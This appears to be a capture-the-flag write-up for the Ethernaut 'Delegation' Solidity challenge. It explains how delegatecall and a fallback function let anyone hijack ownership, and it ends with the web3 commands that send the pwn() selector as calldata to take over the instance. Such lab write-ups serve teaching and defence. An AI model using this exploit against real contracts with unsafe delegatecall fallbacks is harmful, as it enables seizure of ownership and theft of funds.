# Delegation

>The goal of this level is for you to claim ownership of the instance you are given.

>  Things that might help
>
> - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
> - Fallback methods
> - Method ids

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

This challenge is a fairly good example of unsafe `delegatecall`.

Delegatecall is a low level function similar to call. It basically allows a contract A to execute the code of another contract B with A's storage, `msg.sender` and `msg.value`.

A `fallback` function is an external function with neither a name, parameters, or return values. It is called when we send ether directly to a contract but `receive()` is not defined or `msg.data` is not empty.

In order to claim the ownership of the contract, we must call the `pwn()` function.

Here, the fallback function of contract Delegation executes a delegatecall to the contract Delegate.
In Ethereum, you can invoke a public function by sending data in a transaction.

Therefore, we can make this contract call the function of our interest (pwn()) by making a transaction and setting `msg.data` as the encoded function signature of the function `pwn()`. 

To do this, we first calculate the function signature of `pwn()`.

```javascript
await web3.eth.abi.encodeFunctionSignature('pwn()')
```

then we make the transaction,

```javascript
await sendTransaction({data : "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000", to : "0xa57b752f86C5F4513C51E1840Ea860B54d11000A", from : "0x532600377959B703AA4AC2c468DeDe8FAA40B576"})
```
Now, we can check the owner of the contract and confirm that it is our address and then submit the instance.


